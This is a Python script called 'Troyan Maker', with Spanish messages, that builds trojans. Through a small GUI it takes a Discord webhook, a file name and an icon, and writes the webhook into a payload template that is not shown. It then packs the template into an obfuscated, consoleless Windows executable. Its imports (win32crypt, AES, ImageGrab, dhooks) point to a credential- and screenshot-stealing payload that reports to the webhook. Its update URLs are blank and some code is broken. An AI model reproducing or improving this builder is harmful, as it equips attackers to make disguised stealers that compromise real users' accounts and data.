# coding: utf-8
import os
import shutil
import time
import ctypes
import sys
try:
    import requests
except:
    os.system(f"{sys.executable} -m pip install requests")
    import requests
try:
    import PySimpleGUI as sg
except:
    os.system(f"{sys.executable} -m pip install pysimplegui")
    import PySimpleGUI as sg
try:
    import PyInstaller.__main__
except:
    os.system(f"{sys.executable} -m pip install pyinstaller")
try:
    from pyarmor.pyarmor import main
except:
    os.system(f"{sys.executable} -m pip install pyarmor")
try:
    from PIL import ImageGrab
except:
    os.system(f"{sys.executable} -m pip install pillow")
try:
    from dhooks import Webhook, File
except:
    os.system(f"{sys.executable} -m pip install dhooks")
try:
    from Crypto.Cipher import AES
except:
    os.system(f"{sys.executable} -m pip install pycryptodome")
try:
    from colorama import *
except:
    os.system(f"{sys.executable} -m pip install colorama")
try:
    import win32crypt
except:
    os.system(f"{sys.executable} -m pip install pypiwin32")
    os.system("cls")
def build():
    version = requests.get("")
    ctypes.windll.kernel32.SetConsoleTitleW(f"Troyan Maker | Version {version.text} | By Kent")
    if version.text != "1.0.8\n":
        print("Hay una nueva versión disponible, la descarga está en curso.")
        ctypes.windll.kernel32.SetConsoleTitleW(f"Troyan Maker | Actualización en progreso... | Dev: Kent")
        new_version = requests.get("")
        with open("Troyan Maker.zip", 'wb') as file:
            file.write(new_version.content)
        ctypes.windll.kernel32.SetConsoleTitleW("Troyan Maker | Actualizacion completa | Dev: Kent")
        shutil.unpack_archive("TroyanMaker.zip")
        os.remove("TroyanMaker.zip")
        shutil.rmtree("Files")
        print("Actualización completada con éxito !")
        input("Pulse cualquier tecla para continuar...")
        sys.exit()
   

         

    print(f""" {Fore.BLUE}
████████╗██████╗  ██████╗ ██╗   ██╗ █████╗ ███╗   ██╗    ███╗   ███╗ █████╗ ██╗  ██╗███████╗██████╗ 
╚══██╔══╝██╔══██╗██╔═══██╗╚██╗ ██╔╝██╔══██╗████╗  ██║    ████╗ ████║██╔══██╗██║ ██╔╝██╔════╝██╔══██╗
   ██║   ██████╔╝██║   ██║ ╚████╔╝ ███████║██╔██╗ ██║    ██╔████╔██║███████║█████╔╝ █████╗  ██████╔╝
   ██║   ██╔══██╗██║   ██║  ╚██╔╝  ██╔══██║██║╚██╗██║    ██║╚██╔╝██║██╔══██║██╔═██╗ ██╔══╝  ██╔══██╗
   ██║   ██║  ██║╚██████╔╝   ██║   ██║  ██║██║ ╚████║    ██║ ╚═╝ ██║██║  ██║██║  ██╗███████╗██║  ██║
   ╚═╝   ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝    ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ {Fore.Style_RESET_ALL}

   Dev: {Fore.GREEN}KentMG#0069 {Fore.Style_RESET_ALL}                                                          
    """)
    layout = [
        [sg.Text('Webhook', size=(15, 1)), sg.Input(size=(40, 1), key="webhook")],
        [sg.Text('Name File', size=(15, 1)), sg.Input(size=(40, 1), key="name")],
        [sg.Text('Icon', size=(15, 1)), sg.InputText(size=(40, 1), key="iconpath"), sg.FileBrowse(button_text="Abrir", file_types=(("Icon Files", "*.ico"),("All Files", "*.*")), size=(6,1), key="iconbrowse")],
        [sg.Button("Make EXE", size=(10, 1))]
    ]
    window = sg.Window("Troyan Maker", layout=layout)
    while True:
        event, value = window.read()
        if event in ("Exit", "Quit", None):
            break
        elif event == "Make EXE":
            if not os.path.exists("Executable\\"):
                os.mkdir("Executable\\")
            if value["webhook"] == '':
                sg.PopupNonBlocking("Especifique una webhook !")
                continue
            elif value["name"] == '':
                sg.PopupNonBlocking("Especifique un nombre!")
                continue
            elif value['iconpath'] == '':
                sg.PopupNonBlocking("El icono es obligatorio.")
                continue
            check = requests.get(value['webhook'])
            if not check.status_code == 200:
                sg.PopupNonBlocking("El webhook especificado no es válido.")
                continue
            print("Se está creando el .exe. Espere...")
            with open(f"{os.getcwd()}\\Files\\Local.py", "r") as f:
                lines = f.readlines()
            with open(f"Executable\\{value['name']}.py", "w") as f2:
                lines.insert(17, f"url_webhook = \"{str(value['webhook'])}\"")
                f2.write("".join(lines))
            os.chdir('Executable\\')
            icon = value['iconpath']
            name = value['name']
            os.system(f"""pyarmor pack -e \" --noconsole -F '--icon={icon}'\" \"{os.getcwd()}\\{name}.py\"""")
            shutil.move(f"{os.getcwd()}\\dist\\{name}.exe", f"{os.getcwd()}\\{name}.exe")
            shutil.rmtree('build')
            shutil.rmtree('dist')
            os.remove(f"{name}.py")
            os.system('cls')
            sg.PopupNonBlocking("Se ha creado el .exe!")
            

if __name__ == "__main__":
    build()